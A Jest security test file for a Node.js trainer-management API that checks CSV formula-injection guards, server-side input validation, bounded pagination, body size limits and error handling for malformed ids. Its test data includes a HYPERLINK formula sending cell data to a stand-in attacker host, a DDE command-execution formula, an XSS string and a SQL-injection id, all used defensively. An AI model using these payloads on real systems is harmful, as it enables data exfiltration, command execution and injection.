'use strict';

/**
 * Input validation, output encoding and resource bounds (Phase 2B).
 *
 * Covers:
 *   TR-MED-2   spreadsheet formula injection in the CSV export
 *   TR-MED-9   validation that existed only in the React forms
 *   API4       unbounded pagination and oversized request bodies
 *   API8       malformed input answered with a 500 carrying internal detail
 *
 * The malformed-input cases assert "not 500" rather than a specific code: the
 * point is that a junk id is a client error the application recognises, never
 * an unhandled database exception surfacing as a server error.
 */

const request = require('supertest');
const app = require('../../server');
const { createTenant, destroyTenant, pool } = require('../helpers/fixtures');
const { toCSV } = require('../../controllers/exportController');
const {
  sanitizeCsvValue, parseBoundedInt, isEmail, validatePassword, escapeHtml,
} = require('../../utils/validation');

jest.setTimeout(30000);

let A;

beforeAll(async () => {
  A = await createTenant('a');
});

afterAll(async () => {
  await destroyTenant(A?.tenantId);
  await pool.end();
});

const asA = (req) => req.set('Authorization', `Bearer ${A.token}`);

// ── TR-MED-2 ────────────────────────────────────────────────────────────────
describe('TR-MED-2: CSV formula injection', () => {
  test.each([
    ['=HYPERLINK("http://evil.example/?x="&A1,"Click")'],
    ['+1+1'],
    ['-2+3'],
    ['@SUM(A1:A9)'],
    ['\tleading tab'],
    ['\rleading carriage return'],
  ])('a client field starting with a formula character is neutralised: %j', (payload) => {
    const csv = toCSV([{ goals: payload }], ['goals']);
    const dataRow = csv.split('\n')[1];
    // The cell must open with the neutralising quote, so the spreadsheet reads
    // the value as text rather than as the start of a formula. (Asserted on the
    // rendered cell rather than the raw payload because json2csv also escapes
    // any quotes the payload itself contains.)
    expect(dataRow.startsWith('"\'')).toBe(true);
    expect(dataRow.startsWith(`"${payload[0]}`)).toBe(false);
  });

  test('ordinary values are passed through untouched', () => {
    const csv = toCSV([{ goals: 'Lose 5kg', notes: 'Knee injury 2023' }], ['goals', 'notes']);
    expect(csv).toContain('"Lose 5kg"');
    expect(csv).toContain('"Knee injury 2023"');
    expect(csv).not.toContain("'Lose");
  });

  test('non-string values are not stringified by the guard', () => {
    expect(sanitizeCsvValue(42)).toBe(42);
    expect(sanitizeCsvValue(null)).toBeNull();
    expect(sanitizeCsvValue(undefined)).toBeUndefined();
    const d = new Date('2026-01-01T00:00:00Z');
    expect(sanitizeCsvValue(d)).toBe(d);
  });

  test('a real client record with a hostile free-text field exports safely', async () => {
    const attack = '=cmd|\' /C calc\'!A0';
    const { rows: [client] } = await pool.query(
      `INSERT INTO clients (tenant_id, first_name, last_name, goals)
       VALUES ($1, 'Formula', 'Injection', $2) RETURNING *`,
      [A.tenantId, attack]
    );

    const csv = toCSV([client], Object.keys(client));
    expect(csv).toContain(`"'${attack}"`);

    await pool.query('DELETE FROM clients WHERE id = $1', [client.id]);
  });
});

// ── TR-MED-9 ────────────────────────────────────────────────────────────────
describe('TR-MED-9: validation is enforced server-side, not only in the UI', () => {
  test.each([
    ['plainaddress'],
    ['no-at-sign.example.com'],
    ['two@@example.com'],
    ['spaces in@example.com'],
    ['missing-tld@example'],
  ])('registration refuses a malformed email: %s', async (email) => {
    const res = await request(app).post('/api/auth/register').send({
      email, password: 'ValidPassw0rd', firstName: 'A', lastName: 'B',
    });
    expect(res.status).toBe(400);

    const rows = await pool.query('SELECT id FROM users WHERE email = $1', [email.toLowerCase()]);
    expect(rows.rows).toHaveLength(0);
  });

  test('registration refuses a password below the documented minimum', async () => {
    const email = `sec2b-short-${Date.now()}@example.test`;
    const res = await request(app).post('/api/auth/register').send({
      email, password: 'abc', firstName: 'A', lastName: 'B',
    });
    // Previously registration applied no length check at all — the minimum
    // lived only in the React form, so an API caller bypassed it entirely.
    expect(res.status).toBe(400);

    const rows = await pool.query('SELECT id FROM users WHERE email = $1', [email]);
    expect(rows.rows).toHaveLength(0);
  });

  test('registration refuses an absurdly long password rather than hashing it', async () => {
    const email = `sec2b-long-${Date.now()}@example.test`;
    const res = await request(app).post('/api/auth/register').send({
      email, password: 'a'.repeat(5000), firstName: 'A', lastName: 'B',
    });
    expect(res.status).toBe(400);
  });

  test('password reset refuses a password below the minimum', async () => {
    const res = await request(app).post('/api/auth/reset-password')
      .set('X-Forwarded-For', '198.51.100.61')
      .send({ token: 'irrelevant', newPassword: 'abc' });
    expect(res.status).toBe(400);
  });

  test('changing profile email to a malformed address is refused', async () => {
    const res = await asA(request(app).put('/api/profile')).send({ email: 'not-an-email' });
    expect(res.status).toBe(400);

    const row = await pool.query('SELECT email FROM users WHERE id = $1', [A.userId]);
    expect(row.rows[0].email).toBe(A.email);
  });

  test('the validation helpers behave as the endpoints assume', () => {
    expect(isEmail('trainer@example.com')).toBe(true);
    expect(isEmail('trainer@example')).toBe(false);
    expect(isEmail(`${'a'.repeat(250)}@example.com`)).toBe(false);
    expect(validatePassword('12345').ok).toBe(false);
    expect(validatePassword('123456').ok).toBe(true);
    expect(validatePassword(null).ok).toBe(false);
    expect(escapeHtml('<img src=x onerror=alert(1)>'))
      .toBe('&lt;img src=x onerror=alert(1)&gt;');
  });
});

// ── API4: bounded pagination ────────────────────────────────────────────────
describe('API4: pagination and range inputs are bounded', () => {
  test('parseBoundedInt clamps, falls back and never yields NaN', () => {
    expect(parseBoundedInt('50', { fallback: 20, max: 200 })).toBe(50);
    expect(parseBoundedInt('999999', { fallback: 20, max: 200 })).toBe(200);
    expect(parseBoundedInt('0', { fallback: 20, max: 200 })).toBe(1);
    expect(parseBoundedInt('-5', { fallback: 20, max: 200 })).toBe(1);
    expect(parseBoundedInt('abc', { fallback: 20, max: 200 })).toBe(20);
    expect(parseBoundedInt(undefined, { fallback: 20, max: 200 })).toBe(20);
    expect(parseBoundedInt('12abc', { fallback: 20, max: 200 })).toBe(12);
  });

  test.each([
    ['/api/clients/:id/sessions?limit=99999999'],
    ['/api/clients/:id/sessions?limit=not-a-number'],
    ['/api/clients/:id/sessions?limit=-1'],
  ])('client sessions listing survives a hostile limit: %s', async (template) => {
    const url = template.replace(':id', A.clientId);
    const res = await asA(request(app).get(url));
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body.sessions)).toBe(true);
  });

  test.each([
    ['?limit=99999999'],
    ['?limit=not-a-number'],
  ])('group session history survives a hostile limit: %s', async (qs) => {
    const res = await asA(request(app).get(`/api/groups/${A.groupId}/sessions${qs}`));
    expect(res.status).toBe(200);
  });

  test.each([
    ['?months=abc'],
    ['?months=999999999'],
    ['?months=-12'],
  ])('progress endpoints survive a hostile months value: %s', async (qs) => {
    const res = await asA(request(app).get(`/api/progress/client/${A.clientId}${qs}`));
    expect(res.status).toBe(200);
  });

  test('the trainings listing caps how much one request can pull', async () => {
    const res = await asA(request(app).get('/api/trainings?limit=100000&page=1'));
    expect(res.status).toBe(200);
    expect(res.body.limit).toBeLessThanOrEqual(100);
  });
});

// ── API4: request body size ─────────────────────────────────────────────────
describe('API4: request bodies are size-capped', () => {
  test('an oversized JSON body is rejected with 413, not parsed', async () => {
    const res = await asA(request(app).post('/api/clients'))
      .set('Content-Type', 'application/json')
      .send(JSON.stringify({ firstName: 'x', lastName: 'y', notes: 'A'.repeat(200 * 1024) }));

    expect(res.status).toBe(413);

    const rows = await pool.query(
      "SELECT id FROM clients WHERE tenant_id = $1 AND first_name = 'x'",
      [A.tenantId]
    );
    expect(rows.rows).toHaveLength(0);
  });

  test('a normal-sized body is still accepted', async () => {
    const res = await asA(request(app).post('/api/clients'))
      .send({ firstName: 'Normal', lastName: 'Size', notes: 'A'.repeat(1000) });
    expect(res.status).toBe(201);
    await pool.query('DELETE FROM clients WHERE id = $1', [res.body.client.id]);
  });
});

// ── API8: malformed input must not become a 500 ─────────────────────────────
describe('API8: malformed identifiers are client errors, not server errors', () => {
  const malformed = ['not-a-uuid', '123', '%00', "' OR 1=1--"];

  test.each(malformed)('GET /api/clients/%s is not a 500', async (id) => {
    const res = await asA(request(app).get(`/api/clients/${encodeURIComponent(id)}`));
    expect(res.status).toBeLessThan(500);
  });

  test.each(malformed)('POST /api/progress/%s is not a 500', async (id) => {
    const res = await asA(request(app).post(`/api/progress/${encodeURIComponent(id)}`))
      .send({ metric_name: 'weight', value: 1 });
    expect(res.status).toBeLessThan(500);
  });

  test.each(malformed)('POST /api/sessions/%s/attendees is not a 500', async (id) => {
    const res = await asA(request(app).post(`/api/sessions/${encodeURIComponent(id)}/attendees`))
      .send({ clientId: A.clientId });
    expect(res.status).toBeLessThan(500);
  });

  test('an invalid JSON body is refused without echoing parser internals', async () => {
    const res = await asA(request(app).post('/api/clients'))
      .set('Content-Type', 'application/json')
      .send('{"firstName": "unterminated');

    expect(res.status).toBeGreaterThanOrEqual(400);
    expect(res.body).not.toHaveProperty('stack');
    expect(JSON.stringify(res.body)).not.toMatch(/at .*\.js:\d+/);
  });
});
